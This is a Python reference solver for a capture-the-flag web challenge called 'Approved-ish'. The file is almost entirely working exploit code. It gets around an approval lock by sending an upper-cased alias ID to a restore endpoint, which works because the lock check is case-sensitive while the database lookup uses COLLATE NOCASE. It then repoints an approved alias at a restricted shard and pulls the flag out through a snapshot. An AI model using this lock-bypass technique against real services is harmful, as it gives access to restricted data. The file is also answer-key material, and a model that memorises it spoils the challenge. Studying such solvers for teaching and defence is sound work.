#!/usr/bin/env python3
"""Reference solver for Approved-ish (standard library only).

Usage: python3 solve.py [BASE_URL]      default: http://127.0.0.1:8000

Chain:
  1. Create a workspace, an alias -> sample-v1, and a manifest containing it.
  2. Approve the manifest. Approval records only the manifest (id, version,
     alias_ids); it does not pin what each alias resolves to.
  3. PATCH on the alias is now refused (409). /api/aliases/restore enforces the
     same lock, but it checks the client-supplied alias ID with a case-sensitive
     membership test while looking the row up (and updating it) with COLLATE
     NOCASE. Restoring under an upper-cased ID slips past the lock yet still
     repoints the real alias at restricted-v1.
  4. The snapshot builder trusts the old approval and reads shards with the
     service's own authority, so the snapshot contains the restricted shard.
"""

import json
import re
import sys
from contextlib import suppress
from http.cookiejar import CookieJar, DefaultCookiePolicy
from urllib.error import HTTPError
from urllib.request import HTTPCookieProcessor, Request, build_opener

FLAG_RE = re.compile(r"wctf\{[^}\s]+\}")


class Client:
    def __init__(self, base_url, timeout=10):
        self.base = base_url.rstrip("/")
        self.timeout = timeout
        self.opener = build_opener(HTTPCookieProcessor(CookieJar(
            policy=DefaultCookiePolicy(secure_protocols=("https", "http")))))

    def call(self, method, path, body=None, expected=200):
        data = None if body is None else json.dumps(body).encode()
        headers = {"Content-Type": "application/json"} if body is not None else {}
        request = Request(self.base + path, data=data, method=method, headers=headers)
        try:
            response = self.opener.open(request, timeout=self.timeout)
        except HTTPError as error:
            response = error
        with response:
            status, payload = response.status, json.loads(response.read() or b"null")
        if status != expected:
            raise RuntimeError(f"{method} {path}: expected {expected}, got {status}: {payload}")
        return payload


def solve(base_url, verbose=True):
    log = print if verbose else (lambda *_: None)
    c = Client(base_url)
    try:
        c.call("POST", "/api/session", expected=201)
        alias = c.call("POST", "/api/aliases", {"target_shard_id": "sample-v1"}, expected=201)["id"]
        manifest = c.call("POST", "/api/manifests", {"alias_ids": [alias]}, expected=201)["id"]
        base = f"/api/manifests/{manifest}"
        log("[+] approval:", c.call("POST", base + "/approve"))

        c.call("PATCH", f"/api/aliases/{alias}", {"target_shard_id": "restricted-v1"}, expected=409)
        log("[+] PATCH is locked (409)")

        backup = c.call("GET", "/api/aliases/backup")
        # Exact-case restore hits the same lock.
        exact = {**backup, "aliases": [{"id": r["id"], "target_shard_id": "restricted-v1"}
                                       if r["id"] == alias else dict(r) for r in backup["aliases"]]}
        c.call("POST", "/api/aliases/restore", exact, expected=409)
        log("[+] exact-case restore is locked (409); upper-casing the ID to dodge the check")

        # The lock test is case-sensitive; the lookup/update is COLLATE NOCASE.
        for record in backup["aliases"]:
            if record["id"] == alias:
                record["id"] = record["id"].upper()
                record["target_shard_id"] = "restricted-v1"
        log("[+] restore:", c.call("POST", "/api/aliases/restore", backup))

        snapshot = c.call("POST", base + "/snapshot")
        match = FLAG_RE.search(json.dumps(snapshot))
        if not match:
            raise RuntimeError(f"No flag in snapshot: {snapshot}")
        flag = match.group(0)
    except Exception:
        with suppress(Exception):
            c.call("DELETE", "/api/session")
        raise
    c.call("DELETE", "/api/session")
    return flag


if __name__ == "__main__":
    print(solve(sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000"))
